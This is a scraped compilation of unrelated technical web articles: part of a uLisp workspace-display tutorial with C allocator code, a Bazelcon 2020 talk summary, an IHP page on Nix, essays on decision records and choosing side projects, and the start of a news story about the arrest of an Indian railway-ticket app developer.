  for (int i=WORKSPACESIZE-1; i&gt;=0; i--) {
    object *obj = &amp;Workspace[i];
    if (tstflag(DISPLAYFLAG)) PlotObject(i, 0);
    car(obj) = NULL;
    cdr(obj) = Freelist;
    Freelist = obj;
    Freespace++;
  }
}</pre>
<h4>Allocating an object</h4>
<p>A Lisp object in the workspace is allocated by a call to <strong>myalloc()</strong>. It's taken off the freelist and returned by the call. For example, creating the list:</p>
<pre>(fib 6)</pre>
<p>will take four objects from the freelist:</p>
<p><img src="http://www.technoblogy.com/pictures/kvm/objects4.gif" alt="Objects4.gif" width="720" height="130"></p>
<p>The corresponding pixels in the workspace display are plotted in white:</p>
<pre>object *myalloc () {
  if (Freespace == 0) error2(0, PSTR("no room"));
  object *temp = Freelist;
  Freelist = cdr(Freelist);
  Freespace--;
  if (tstflag(DISPLAYFLAG)) PlotObject(((int)temp - (int)Workspace)&gt;&gt;3, 1);
  return temp;
}</pre>
<p>The address of the object is calculated by subtracting the address of the start of the workspace from the address of the new object, and dividing by eight because each Lisp object is 8 bytes.</p>
<h4>Freeing an object</h4>
<p>Finally, a Lisp object is freed by a call to <strong>myfree()</strong>. It is put on the front of the freelist, and the corresponding pixel in the workspace display is plotted in black:</p>
<pre>inline void myfree (object *obj) {
  car(obj) = NULL;
  cdr(obj) = Freelist;
  Freelist = obj;
  if (tstflag(DISPLAYFLAG)) PlotObject(((int)obj - (int)Workspace)&gt;&gt;3, 0);
  Freespace++;
}</pre>
<p>Objects are freed automatically during garbage collection; the programmer doesn't have to worry about freeing objects.</p>
<h4>Graphics display routines</h4>
<p>This display maps each byte in the display memory to a vertical column of eight pixels. Unfortunately the SSD1306 display driver chip doesn't support reading back of the contents of the display memory, so to provide the ability to change a single pixel, without affecting the others in the same column, a copy of the display memory is maintained in RAM; fortunately it's only 384 bytes (64x48/8).</p>
<p>The routines used to implement the workspace display are <strong>InitDisplay()</strong>, to initialise the OLED display, <strong>ClearDisplay()</strong> to clear the display, and <strong>PlotObject()</strong>, which plots a pixel corresponding to a Lisp object in the workspace.</p>
<h3>Uploading the program</h3>
<p>Whether you're using an Adafruit ItsyBitsy M0, or an ATSAMD21E on a breadboard as described in my article&nbsp;<a href="http://www.technoblogy.com/show?2833">Minimal ATSAMD21 Computer</a>, upload the Visible Lisp Computer as follows:</p>
<ul>
<li>If you haven't already got it, install the <strong>Adafruit SAMD Boards</strong> in the <strong>Boards Manager</strong>.</li>
<li>Select the <strong>Adafruit ItsyBitsy M0</strong> board.</li>
<li>Upload the Visible Lisp Computer file to the board.</li>
</ul>
<p>You should then be able to run uLisp, and enter commands at the Serial Monitor as described in <a href="http://www.ulisp.com/show?19XT">Using uLisp</a>.</p>
<p>This is based on the current version of uLisp, Version 2.8a, but for simplicity it only supports the&nbsp;<strong>Adafruit ItsyBitsy M0</strong>&nbsp;Boards Manager option.</p>
<p>Here's the whole Visible Lisp Computer program:&nbsp;<a href="http://www.technoblogy.com/list?2OLU">Visible Lisp Computer program</a>.</p>
<p>Or get it from GitHub here: <a href="https://github.com/technoblogy/visible-lisp-computer" target="_blank">Visible Lisp Computer</a>.</p>
<h3>Further suggestions</h3>
<p>The current project simply distinguishes between an allocated Lisp object (white) and a free object (black). Using a colour display you could use different colours to identify the different types of object: nil, symbol, integer, stream, character, float, string, or cons.</p><hr>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Last week the annual Bazelcon conference took place remotely. In this post I’ll try to summarize the talks that I found more interesting.</p>
<h2>Keynote - State of Bazel and Announcements</h2>
<p>The first one to take the stage was <strong>Jeff Cox</strong>, the engineering director at Google, to talk about the state of Bazel.</p>
<p>He remembered the history of Bazel and the idea behind the tool. During the talk, he presented the major achievements of the year.
In particular, the port of Bazel for arm64 platforms, the improvement of tools like Startlark CPU profiler and remote execution profiling.
On the other side, there were some lows, and Cox underlined how the huge backlog of PRs and issues that need to be addressed will be a priority for the team next year.</p>

<em>Jeff Cox explains the reason behind Bazel’s name.</em></p>
<p><strong>Cox presented the roadmap</strong> for the tool and stated how the focus will be to evolve Bazel as a Platform. They want to improve Startlark rules API, revamp the external dependencies support to make it more usable for developers, and improve remote execution support.
He also announced that starting from December, there will be <strong>Long Term Support releases</strong> with 9 months support window.</p>
<h2>Migrating Twitter’s Monorepo from Pants to Bazel</h2>
<p><strong>Borja Lorente</strong>, Build Engineer at Twitter, explained how Twitter is migrating his monorepo from their in-house tool Pants to Bazel.</p>
<p>Twitter repo is a multilanguage 20 million lines of code plus a 10x generated code and over 2000 developers working on it. They wanted to minimize the friction for users during the migration, so <strong>big bang commits were not an option.</strong> As Lorente explained, migrating all at once would have been a pain both for users who had to learn how to use Bazel and for the build team that had to support the developers.</p>
<p>So they decided to do it gradually and maintain both Pants and Bazel at the same time. They did it by developing a <strong>Translation Layer</strong>. Bazel imports the Translation Layer at load time, uses it to translate Pants targets into Bazel rules, and returns the build graph containing Bazel targets.</p>

  </a>
<em>Borja Lorente explains the Translation Layer at Twitter.</em></p>
<p><strong>But it’s not so straightforward.</strong>
There are differences between Pants and Bazel that the build team is tackling. Some of them involve dependencies.</p>
<p>In Pants targets have implicitly all their transitive dependencies when being compiled, rather in Bazel, you must explicitly export them. For 3rd party dependencies, Pants decide the version to use based on the build target, in Bazel, you need to explicitly define them before running.</p>
<p>Twitter journey to Bazel is still in progress and those and other issues are currently worked on by the build team.</p>
<h2>Designing a Language Agnostic CI using Bazel Queries</h2>
<p><strong>Urvashi Reddy</strong>, Software Engineer at Pinterest from the Engineering Productivity Team presented a tool developed by her team to speed up their CI feedback cycle.</p>
<p>They realized that the CI was not able to detect which target changed so was it was frequently building all the targets.</p>
<p><strong>This was too time-consuming.</strong></p>
<p>They wanted to improve the situation by providing fast and reproducible builds and, at the same time, use a self-service approach: developers only need to write a BUILD file and not any new CI configuration.
In this scenario, <strong>the BUILD file is the contract</strong> between developers and CI: developers dictate what want to run in CI within the BUILD file and the CI will take care of that.</p>

    </span>
  </span>
  </a>
<em>Urvashi Reddy explains how the CI stages work.</em></p>
<p>Reddy and her team developed a tool called <strong>build-collector</strong> that, given two commit SHAs, outputs the minimal set of modified targets.</p>
<p>The tool understands the kind of file changed and based on that runs a query to collect the affected targets. These targets are then used for the test stage and for the build and release stages. For the test stage, the tool runs an additional query to filter out only the test targets. For the build and release stages, they use another query but the strategy is different.</p>
<p>Reddy’s team has written a <strong>custom release macro</strong> used to publish release artifacts, called artifacts<em>ci</em>release. The macro makes the query easier since the build-collector can use it to collect the targets for the build and release stages.</p>
<p>Among the next steps, the team is planning to use an automatic process to <strong>identify flaky tests</strong>, tag them, and remove them from the running tests in CI. They also want to improve the query analysis performance using hashes.</p>
<h2>Adopting Bazel in a Quickly Scaling Organization</h2>
<p><strong>Charles Essien</strong>, Engineering Lead at CarGurus, talked about how he and his team went from knowing next to nothing about Bazel to actively work with the Bazel community.</p>
<p>Pre Bazel the CarGurus’ monorepo had a lot of <strong>Dark Debt</strong>: it’s the measurable range on known unknowns or the things that you know you have to improve upon. The Dark Debt at CarGurus was in the form of a 1.2M lines of code monorepo where it was too easy to include packages and dependencies transitively in monolithic artifacts, slow build times, and <strong>a build that you couldn’t trust.</strong></p>
<p>Essien explained how he and his team chose Bazel not only for the reproducible build but also to <strong>simplify</strong>: they managed to remove a lot of old code while adding only a few new to make Bazel work, decreasing the potential for tech debt. The team enabled developers to easily write new libraries and to safely reuse code thanks to BUILD visibility.</p>
<p>Talking about performance, after the bazelization, the build time went from 18 minutes with Maven in a developer laptop to 8 minutes with Bazel without a shared remote cache. With remote caching and remote execution, configured for a build without the bytes, the build time goes <em>from 90 seconds to 5 and a half minutes</em> in the worst case.</p>

<em>Charles Essien explaining the results of the bazelization.</em></p>
<p>The migration took 2 years and there were some huge challenges to face, one of the biggest was to <strong>clean up their java dependency graph</strong> and get rid of transitive dependencies, cyclic dependencies, and even duplicated dependencies. Essien had to work with developers in his organization to understand the intent behind dependencies and that slowed down the transition. He also mentioned that getting developers trust the tool and don’t clean the build was definitely not easy.</p>
<p>There were some takeaways from the migration. <strong>Observability is key</strong> since Essien and his team measured build times for Maven and Bazel and used it as a metric to show the practical benefits of Bazel. Another thing to focus on is the reproducibility of the build, meaning better caching for developers and less “it worked on my machine” as you scale</p>

            <ul>
                <li>
                    <strong>Easy Onboarding</strong>

                    <p>
                        Making haskell web apps is a complicated process. You need the right haskell compiler, a build tool, lots of libraries to do useful things and a database software. To make IHP as accessible as possible, we want to initially hide all this from the user. We set out to make IHP usable for people who have not yet heard about ghc and cabal.
                    </p>

                    <p>
                        Additionally when you are using an older compiler version, some library is missing or your postgres is not the right version this will cause trouble. Solving these package management issues is always a huge time sink.
                    </p>

                    <p>
                        Npm is mainly used for packaging javascript code. Composer is used for packaging php code. And homebrew is used for installing npm and composer ;) Nix is different: It is able to package system software and all kinds of software ecosystems. This is what allows us to bundle all the dependencies of IHP using just a single package manager. Exactly what we need to make a truly batteries-included framework.
                    </p>

                </li>

                <li>
                    <strong>Integrated Dev Tooling</strong>

                    <p>
                        Nix is unique in that it allows us to exactly specify the version of a package we want to install. We can say: <i>Install the latest <q>postgres 12.3</q></i>. Nix also allows us to install packages locally for a specific project instead of managing all the dependencies system wide.
                    </p>
                    
                    <p>
                        These two properties make nix a great fit to achive our goal of simplifying the package management process. Nix allows us to easily install all this software for developers working with IHP. We can install exactly the right compiler, the right postgres version as well as all the right libraries we need. We can be sure that all packages are installed in the right version (no time sinks!) and nothing is missing. We also don't have any interference with existing packages already installed on the system. It's like docker without the overhead of a VM.
                    </p>

                    <p>
                        The IHP dev server automatically starts and manages a postgres server in the background, just for your project. <a href="https://news.ycombinator.com/item?id=23612217" target="_blank">IHP is the first framework tighly integrating the database in the dev mode.</a> <a href="https://twitter.com/zaiste/status/1277678880782979072" target="_blank">We're sure that this will be standard in a couple of years.</a> Without the possibilities of nix, we would have never tried to integrate postgres into the IHP dev server. The integrated database schema designer wouldn't really work that well. It might not be obvious, but without nix we would not have tools like the IHP schema designer or the database viewer.
                    </p>

                </li>

                <li>
                    <strong>Pinned Versions</strong>

                    <p>
                        Nix makes IHP projects reproducable in a way unseen in other software ecosystems.
                        <a href="https://github.com/digitallyinduced/ihp-boilerplate/blob/master/Config/nix/nixpkgs-config.nix#L21" target="_blank">All IHP projects share exactly the same set of packages.</a> The same compiler version, the same libraries, the same postgres version and even the same custom dependencies your app depends on. <q>Works on my machine</q> will not happen anymore. When there is a problem, other IHP users will most likely already have faced the same issue. 
                    </p>

                    <p>
                        This is only possible because nix allows us to pin down the set of package definitions to a specific git commit of the nix package registry.
                    </p>
                </li>

                <li>
                    <strong>Trade Offs</strong>

                    <p>
                        Nix is far from perfect. Early on we had a lot of problems with slow rebuild times, which we could resolve by using the great <a href="https://cachix.org/" target="_blank">cachix</a> binary cache. Additionally Nix is very hard to install. This is a stumbling block for a lot of people. <a href="https://github.com/digitallyinduced/ihp/issues/93" target="_blank">Especially when using certain macOS systems you cannot even install nix at all.</a> Luckily most of the nix problems, like the macOS issues will be solved with time. 
                    </p>

                    <p>
                        Once nix is set up, it's usually working very well. Over time the benefits of nix really outweight the time spent on solving nix-specific problems. The rising industry adoption of Nix is a good indicator for this. <a href="https://engineering.shopify.com/blogs/engineering/what-is-nix" target="_blank">Cool companies like Shopify are progressively adopting Nix.</a>
                    </p>

                    <p>
                        At digitally induced we believe that highest quality software is built on solid foundations.
                        Nix is technological superior to any other existing package manager. Therefore we belive it's right to make nix a hard requirement of IHP. 
                    </p>

<![CDATA[Use Decision Records Already]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<p>At work we have "design decision documents" (DDDs).
Others call the "architecture decision records" (ADRs).
In short,
you record a problem, its possible solutions, and which one you picked.
This method can be lightweight and easy,
so it is a great way to start working more systematically
on any software architecture.
I recommend writing them.
ThoughtWorks recommends to
<a href="https://www.thoughtworks.com/radar/techniques/lightweight-architecture-decision-records">adopt them since 2017</a>.</p>
<p><img alt="makin decisions ain't  easy" src="https://beza1e1.tuxen.de/img/decisions_easy.jpg"></p>
<h2>Why decision records?</h2>
<p>Important about decision records is that they
document a decision made at one point in time.
This means they require no maintenance (apart from archival)
and this is a big argument why they are so lightweight.
If you make no decisions,
there is no effort.</p>
<p>At the beginning of a software project
you make a lot of high impact decisions quickly.
You pick a programming language, framework, libraries, version control system,
folder structure, tools, and methods.
Usually these choices are made haphazardly.
Trying to make them all thoughtfully is futile.
However, you should be able to write them down with a rational.</p>
<p>Another strength of a lightweight process shows up
when a project is under pressure.
You don't have the capacity for rigorous decision making
like building a prototype.
Writing down the decision should still be possible.
Deadline pressure or lack of capacity are valid arguments
in a decision record so you might document that
you accept the technical debt to meet a deadline.
At least, a few years later people know <em>why</em> you made stupid choices.</p>
<p>You could even record decision
long after the decision were actually made.
While the best time to write it was right before the decision was made,
the second best time is now.</p>
<p>Having decision records is useful to communicate a decision to many people.
This includes new people joining months later.
Here it pays off if you can write well.
I have seen Powerpoint slides
which are incomprehensible without the original author
but still considered "documentation".
This is tragic.
Such diagrams are more of a memory aid than documentation.
Hence, I favor well written prose.</p>
<p>Decision records also serve as historic documentation
when someone questions the decision.
You can revisit the argumentation and check why the decision looks stupid now.
Did the circumstances change?
Then there is no reason to blame anyone.
Was something overlooked?
Now we might learn something:
How can you prevent to overlook similar things in the future?</p>
<p>A decision record is frozen once a decision is made.
The only exception is declaring it obsolete.
This has three implications:</p>
<ul>
<li>If something changes about a decision,
  write a new record instead of modifying the old one.</li>
<li>The record is <em>not</em> the place to track the implementation.
  You probably have an issue tracker for such stuff.</li>
<li>Only one decision per record.
  If you try to make multiple at once, the risk is that only one is made.
  Now the record is in an ambiguous half-frozen state.</li>
</ul>
<p>Tooling does not matter.
You can use a wiki, Word, Markdown, or whatever.
Just ensure that you can link to individual records.</p>
<h2>Lightweight Template</h2>
<p>As a running example,
let us decide about which SQL database technology we use.</p>
<p>Once you have collected a few decision records,
you appreciate a summarizing header.
After a title like "SQL Database Tech",
I like to see a short table like this:</p>
<table>
<tbody><tr>
<th>Status</th><td>Approved on <a>2020-10-18</a></td>
</tr><tr>
<th>Decision</th><td>Option 2: PostgreSQL</td>
</tr><tr>
<th>Roll-out</th><td><a>#353</a></td>
</tr><tr>
<th>Primary author</th><td>Linus Carmack</td></tr>
</tbody></table>

<p>The <strong>status</strong> tells you
if a decision record is still a draft, valid, or obsolete.
If valid, it should also have a date since when.
I also like to link it to some meeting notes where the decision was made
but that depends on your organization.
Likewise, for obsolete decisions link somewhere for a rational,
like another decision record.</p>
<p>The second field is an ultra-short version of the <strong>decision</strong> made.
It is for people who already know the record,
so one or two words should be enough.
Use whatever name people use when discussing the solutions.
Internal jargon is ok since it is just a name like "PostgreSQL" in our example.</p>
<p>The <strong>roll-out</strong> field links to a ticket.
Once a decision is made,
it is not instantly implemented.
While the status field here describes the status of the decision,
this links to where the implementation status is tracked.</p>
<p><strong>Primary author</strong> contains a <em>single</em> name
to provide a contact.
It also says "primary" to suggest that others can contribute.
If you want to document all authors,
don't use the header.</p>
<p>Now comes the first prose section of the record,
which describes the <strong>problem</strong>.
A reader should get all relevant context here
and probably links for more details.
Keep the solution space as wide as possible.
For our example,
we should explain why we are already committed to SQL and NoSQL is no option.
Also, it should explain why an explicit decision is necessary
and to defer it by abstraction is no option.</p>
<p>If a problem requires multiple decisions
then you might get multiple decision records
with similar problem descriptions.
Or maybe you should think more what the actual problem is.
Sometimes people mistake the reason to make a decision
with the problem to solve.
For example,
"customer wants to know what database tech we will use"
is not a problem.
The problem is to store data persistently.</p>
<p>Next comes a section which describes all <strong>potential solutions</strong> to the problem.
This section usually has the most contributors and is revised the most.
Describe every solution in as much detail as you can.
For our example,
the usual options would be SQLite, MySQL, and PostgreSQL.
Maybe even commercial ones.
A little over-specification does not hurt.
You could describe how you would deploy and host PostgreSQL on its own server.</p>
<p>Cross check that the solutions actually solve the described problem.
Surprisingly often I found mismatches.
Sometimes the problem was described too constraining.
Sometimes some text had to be shifted from problem to solution or vice versa.
And sometimes we had forgotten to consider an aspect of the problem.</p>
<p>I despise use a table for the solution descriptions.
It conflicts with my preference for prose.
If you write longer text or even include diagrams,
the table becomes to wide to be readable.
So a table makes you write short bullet points
and those are harder to comprehend.</p>
<p>The third section is about <strong>evaluation</strong> and making the decision.
It helps to keep a list of evaluation criteria somewhere
to pick the relevant ones.
If you have nothing, browse through the
<a href="https://en.wikipedia.org/wiki/List_of_system_quality_attributes">Wikipedia list of ilities</a>.
I try to keep this section short and
prefer to describe details (like pros and cons)
in the previous section.
Here a table is appropriate to compare the solutions.
I like to only put + and - signs into the cells
and order the rows by importance.
From the table, it should be obvious which solution is picked.
Ideally, you only take a quick look at the first two rows
and pick the solution with the most + symbols.</p>
<p>To summarize a table of contents looks like this:</p>
<ul>
<li>Header</li>
<li>Problem description</li>
<li>Potential Solutions<ol>
<li>SQLite</li>
<li>MySQL</li>
<li>PostgreSQL</li>
</ol>
</li>
<li>Decision</li>
</ul>
<h2>Optional extensions</h2>
<p>The header could contain more fields like
<strong>revision</strong>, <strong>executive summary</strong>, <strong>id</strong>, <strong>decision makers</strong>,
or whatever.</p>
<p>A section or table about the <strong>stakeholders</strong>
can make sense under some circumstances.
For example, a safety or security expert might be relevant or not
for the decision.</p>
<p>The problem description section can be split up into
<strong>assumptions</strong>, <strong>constraints</strong>, <strong>requirements</strong>, <strong>related things</strong>, and whatnot.
I avoid overly formal templates
because if a section makes no sense
it encourages people to skip entire sections.
This is not a habit to encourage.</p>
<p>Likewise the potential solutions or the evaluation can be formalized more
to include mandatory <strong>risk evaluation</strong>, <strong>cost estimates</strong>, and whatnot.</p>
<p>You could include <strong>meeting notes</strong> around a decision
within the record.
This only makes sense if meeting notes are not already captured otherwise.</p>
<p>In a political setting,
you could capture the <strong>opinions</strong> of each stakeholder separately.
This way a worried party can have their objections on record
with their name attached instead of an anonymous downside description.</p>
<p>Maybe a <strong>glossary</strong> makes sense?
On the other hand, decision records should probably not that long to require one.</p>
<h2>Even more lightweight</h2>
<p>You could trim decision records down even more
if you don't describe alternative solutions.
Instead you only describe the one you picked eventually.
Such records are still valuable since they capture the rational.
However, if a new proposal comes up later,
you don't know if it was considered originally
and dismissed for some valid reasons.
Anyways, you might use this lighter approach at the beginning of a project
when a lot of decisions must be made quickly.
Incomplete records are better than none.</p>
<p>One last advice:
The first ten decision records will be crappy.
Get them done sooner than later.</p>

A finalized, working project can be placed on your resume, be showcased to other people, offer you more learning opportunities, and potentially become your income source in the future.</p><p>An abandoned project is a little bit of learning and a plus one to the number of your abandoned projects.</p><p>If you disagree with the above, then you can simply close this article and move on.</p><p>If you agree, here’s a related comic.</p><p><img src="https://www.commitstrip.com/wp-content/uploads/2014/11/Strip-Side-project-650-finalenglish.jpg#c" alt="Side Project Comic"></p><p>I think we’ve all been in those shoes and have our own skeletons in the closet.</p><p>I have been programming for over 11 years and have started many pet projects, but only a few of them saw the light of the day (or rather the eyes of the users).</p><p>Choosing a project idea is a task that depends on many factors like your level of experience, domain of activity, tech stack, your interests, your goals, etc., so do not expect to learn the best idea ever for your next project in this article.</p><p>What you can expect is to learn some generally applicable principles that will help you make a better choice.</p><h2 id="how-do-people-learn">How Do People Learn?</h2><p>Let’s briefly discuss about <a href="https://iuliangulea.com/brain-basics/">how people learn</a> first. Whenever you read a book, watch a tutorial, or practice a skill, neurons in our brain fire together, forming complex neural circuits. It is these circuits that store the knowledge and skills we possess.</p><p>Moreover, our memory is associative, meaning that subsets of neural patterns are parts of many circuits. That explains how you can end up thinking about totally unrelated things to what you are currently doing. Some words might trigger a memory, which triggers another memory, and so on.</p><p>For instance, think of the last time you went to the seaside. Then think about what was the most memorable moment during that trip. Finally, think about something related to that unforgettable moment. This is how you hop around memories.</p><p>This also hints toward a more efficient approach toward learning new things: it is easier to “reuse” existing circuits rather than create new ones.</p><p>Consider these two explanations of what a computer program is:</p><blockquote><p>A computer program is a collection of instructions organized in functions, classes, modules, and libraries that perform a specific task.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p></blockquote><blockquote><p>A computer program consists of code that is grouped into entities called functions, classes, modules, and libraries. Like a lego, you can build a program to perform a specific task by combining various pieces together.</p></blockquote><p>The first is generic and very abstract, and it doesn’t consider any pre-existing knowledge in the listener’s mind. The second one makes an analogy and is easier to process since you can tap into your existing knowledge about what lego is and how it works.</p><p>Another crucial thing to learning is pre-requisite knowledge. You cannot build a roof without building the walls of a house. Although this sounds obvious, sometimes you might get too enthusiastic about a potential project, but because you don’t understand the fundamentals, you won’t be able to realize your idea.</p><h2 id="build-on-the-current-state-of-your-knowledge">Build On The Current State Of Your Knowledge</h2><p>Your next project should be based on some of your existing knowledge upon which you can learn new things. This might sound self-evident, but sometimes we simply skip the analysis phase and jump right into the development phase.</p><p>The amount of all knowledge required to build a project should overlap with your existing experience. Otherwise, learning will be inefficient.</p><p>You might want to take on a project that will teach you <strong>lots</strong> of new concepts, but bear in mind that creating new neural pathways takes time and energy. Keep in mind that there is no fast way to do that, so if you want to be efficient at it, you have to take the slow route.</p><p><img src="https://iuliangulea.com/images/how-to-choose-project-venn-diagram.png" alt="Three types of projects as Venn diagrams"></p><p>There is a blurry line between efficient and inefficient projects from a learning standpoint:</p><ul><li>Choose a project that is too easy for you, and your learning will be minimal. Also, you might become bored along the way, not even finalizing it.</li><li>Choose a project that is too complex, and you will become frustrated and overwhelmed with the amount of information you need to learn and apply, which will increase the chances that you might as well abandon it.</li></ul><p>Finally, to shape up and structure the knowledge you already have, it helps to think about it through the prism of the <a href="https://iuliangulea.com/pyramid-of-mastery/">Pyramid of Mastery</a>.</p><p><img src="https://iuliangulea.com/images/the-pyramid-of-mastery/the-pyramid-of-mastery-1.png" alt="The Pyramid Of Mastery"></p><p>The Pyramid of Mastery allows you to define a domain in terms of four layers: Elements (main concepts and building blocks), Rules (both how Elements operate and general Rules within the domain), Tools, and Frameworks.</p><p>With this in mind, let’s discuss some strategies that can help you choose your next pet project are.</p><h2 id="3-aspects-to-help-you-choose-your-next-side-project">3 Aspects To Help You Choose Your Next Side Project</h2><p>Below you can find general guidelines that will help you make the right decision regarding your next project.</p><h3 id="1-focus-on-a-single-layer-from-the-pyramid-of-mastery">1. Focus On A Single Layer From The Pyramid Of Mastery</h3><p>This is a guiding principle I follow whenever I choose to do a personal project: narrow down the scope of the type of knowledge you want to gain.</p><p>Do not mix up new Elements, Rules, Tools, and Frameworks together. Ideally, focus on a single layer and choose a project that will help you gain expertise in that specific area. If that is not possible, do not go more than two layers.</p><p>This is a common mistake that beginners make. They want to learn as much as possible from a single project. But quite often, those expectations are unrealistic. If you want to learn a framework, in a new programming language, using principles that you haven’t used before (e.g., <a href="https://en.wikipedia.org/wiki/Asynchrony_(computer_programming)">asynchronous programming</a>, <a href="https://en.wikipedia.org/wiki/Design_Patterns">design patterns</a>, etc.), you are going to be overwhelmed with so much new information, that you won’t be able to process it and learn anything at all.</p><p>On many occasions, I made this mistake myself, and each time I had to review my project choice and start over with more realistic expectations and a narrower learning scope.</p><p>Therefore, if you want to start a project to learn new programming concepts, make it in the language you know best. If you’re going to build a project to learn a new programming language, do not throw in new Elements and Rules — focus on what you already know. Likewise, if you want to learn a new framework, make sure you are familiar with most of the Elements, Rules, and Tools it consists of.</p><p>This is also why it is not advisable to start learning programming with a Framework — you will get overwhelmed very fast by the vast amount of information on different Elements, programming Rules, programming language Rules, framework Rules, various Tools, etc. if you do not already know them.</p><h3 id="2-choose-a-project-of-an-appropriate-size">2. Choose A Project Of An Appropriate Size</h3><p>You might want to build the next Facebook, but sometimes you should focus on building a simple function or class first. This is a bit exaggerated, but as a general rule, your projects' scope should increase once you get more experience in your field.</p><p><img src="https://iuliangulea.com/images/the-pyramid-of-mastery-swe/scale-of-impact.png#c" alt="Image with line chart"></p><p>Initially, focus on smaller projects with limited scope. When you start learning something, the amount of information you have to process is enormous. Since our <a href="https://iuliangulea.com/working-memory/">working memory</a> has a very limited capacity, keep the tasks small to not overwhelm it.</p><p>Once you have a solid foundation and understanding of the essential Elements and Rules, you can start working on slightly bigger projects. It is very similar to construction.</p><p>In construction, you cannot raise the walls of a brick house in a day. There is a certain recommended height to which you can grow the walls — around 4–5 feet<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>. Once you reach that, you have to let the cement solidify, as otherwise, the wall can tilt and collapse.</p><p><strong>Pro Tip:</strong> the scope size is also a better indicator than years of experience of a software engineer’s seniority level. You can have 5 years of experience, but if you work on individual modules and do not participate in bigger architectural decisions, you are a mid-level developer.</p><h3 id="3-choose-something-that-will-motivate-you">3. Choose Something That Will Motivate You</h3><p>Another aspect of project selection is the motivation you have to build it. If you are working on something you are excited about, chances are higher that you will actually finalize it and learn from it.</p><p>Even small projects can be challenging and exciting to build — you just need to put some thought into what you would like to create, depending on what you would like to learn.</p><p>There are several approaches to it that I find helpful:</p><p><strong>1. Think about what actions you are repeatedly performing that you could automate.</strong> It can be a small thing, like <em>writing a function that would erase the contents of your computer’s Trash Bin and then automate it to execute once a week.</em></p><p><strong>2. Think about what would be useful to you once in a while.</strong> Even if there might be dozens of existing services out there that offer it. For instance, <em>write a command-line interface (cli) to which you are providing a path, and it doubles down the sizes of all the images it finds in that path, thus saving disk space.</em></p><p><strong>3. Think about what features you like in some products/services, and build them from scratch.</strong> Here, the options are countless. Just pick your favorite service and try to reproduce a small part of it.</p><p><strong>4. Think about a problem you have that you would like to resolve.</strong> This resonates with point 1 from above, but on a bigger scale. And this is also the entry point to the realm of entrepreneurs and doers. Many people have started their companies simply because they didn’t like the current state of the services and products they have used.</p><p>And then there’s always the option to google a list of project ideas and pick one, but you can do better than that.</p><p>Remember that the goal to follow when selecting a project is to learn something new while also improving your work/life/leisure/etc. This will keep fueling your motivation and help you go through it till the end.</p><h2 id="conclusion">Conclusion</h2><p>Successful learning projects are much more than just an idea. However, a good idea is the first step that you need to have to build a project.</p><p>To wrap up this guide, here are the strategies to keep in mind when choosing your next project:</p><ol><li>Decide on what you want to learn. The Pyramid …</li></ol></div></div>

        <p><figcaption>S. Yuvarajaa</figcaption></p></figure><div><p><em>Editor’s note: IRCTC’s response on Twitter has been added to the story.&nbsp;</em></p><p>Kozhikode, KERALA — On the afternoon of October 23, S. Yuvarajaa was at his home in Tirupur, writing software, when the Railway Police Force came knocking on his door.&nbsp;</p><p>“Did you develop this app?” the policemen asked, pointing to a phone screen displaying Super Tatkal, a phone app developed by Yuvarajaa that books tatkal rail tickets much faster than Indian Railway Catering and Tourism Corporation (<a href="https://www.huffingtonpost.in/news/irctc/">IRCTC</a>), the Indian Railways’ famously cumbersome website.</p><p>When he said ‘yes’, Yuvarajaa, a 32-year-old alumnus of IIT-Kharagpur, was arrested under the Indian Railways Act 1989 for the “unauthorized business of procuring and supplying railway tickets”.</p><p><em><strong><a href="https://www.huffingtonpost.in/entry/lsr-student-suicide-lockdown-poverty-hostel-policy_in_5fa8ab81c5b6f21920dd705e" target="_blank" rel="noopener noreferrer">Lockdown Poverty And Hostel Policy Push LSR Scholarship Student To Suicide</a></strong></em></p><p>Soon after his arrest, the railway authorities deactivated Super Tatkal and Super Tatkal Pro, which were available on Google Playstore until then. Yuvarajaa spent about a week in jail.</p><p>Now out on bail and faced with mounting legal fees, Yuvarajaa says he just wants the railways to understand that far from “swindling” users — as the railways have alleged — he just wanted to help rail passengers book their tickets with ease.</p><p>“I want them to talk to me and find out how the apps can help IRCTC’s ticket-booking operations. I might have been naïve and unaware of consequences when I developed the apps but I had the best of intentions,” Yuvarajaa told <em>HuffPost India</em>. “I have a solution that can effectively address the current issues on the IRCTC website<strong>.</strong> I would like to help them make their website better so that end users, the passengers, can book tickets easily.”</p><p>For now, Yuvarajaa and Super Tatkal have become unfortunate case studies of what happens when the software industry’s ethos of digital disruption crashes into India’s famously prickly bureaucracy as epitomised by the 167-year-old Indian Railways.&nbsp;</p><p>A young coder from a small town who gave up a comfortable job in an aeronautics firm to set up his own business, Yuvarajaa is a poster child for the Indian government’s mission to support digital entrepreneurs of the sort that Prime Minister <a href="https://www.huffingtonpost.in/news/narendra-modi/">Narendra Modi</a> exhorts to “take risks” and embark on adventures.</p><p>Yet, as Yuvarajaa’s arrest shows, the biggest impediment to innovation are his government’s many departments. Yuvarajaa saw himself as an entrepreneur’ but the Railways press release announcing his arrest described him as a “tout”.</p><p>&nbsp;“Regulatory frameworks, be that of IRCTC or that of any other government institution, should not be bypassed,” said S. Arunachalam, Academic Director of Centre for Innovation and Entrepreneurship, Indian School of Business. “But I think that he should have been warned first to reach an amicable solution.”&nbsp;</p><p>IRCTC responded to <em>HuffPost India</em> on Twitter, saying that the use of “illegal software” is prohibited under the Railways Act.</p></div><div><blockquote data-dnt="true" data-conversation="none"><p lang="en" dir="ltr">The software developed was used illegally to book tkts through the tickets denying genuine users.Use of illegal software is prohibited under Rly act. No faster app as these features were  available with IRCTC which were disabled to ensure level playing field .</p>— IRCTC (@IRCTCofficial) <a href="https://twitter.com/IRCTCofficial/status/1328668272032583683?ref_src=twsrc%5Etfw" target="_blank">November 17, 2020</a></blockquote></div><div><h3><strong>From Tirupur to Super Tatkal</strong></h3><p>The story of Super Tatkal has its roots in Yuvarajaa’s journey from a small town in Tamil Nadu to Bengaluru, India’s self-described Silicon Valley.</p><p>Yuvarajaa comes from a family of farmers—&nbsp;his father worked as one until he died in 2008 and his mother, Eswari, still cultivates the family’s 30 acres of land.</p><p>Yuvarajaa recalls that he first started programming in BASIC as an 11-year-old. Soon, he developed a love for coding and started considering engineering as a career option when he was introduced to Java in Class XI.&nbsp;&nbsp;</p><p>In 2007, Yuvarajaa signed up for an aeronautical engineering degree at the Madras Institute of Technology, Tamil Nadu’s premier tech 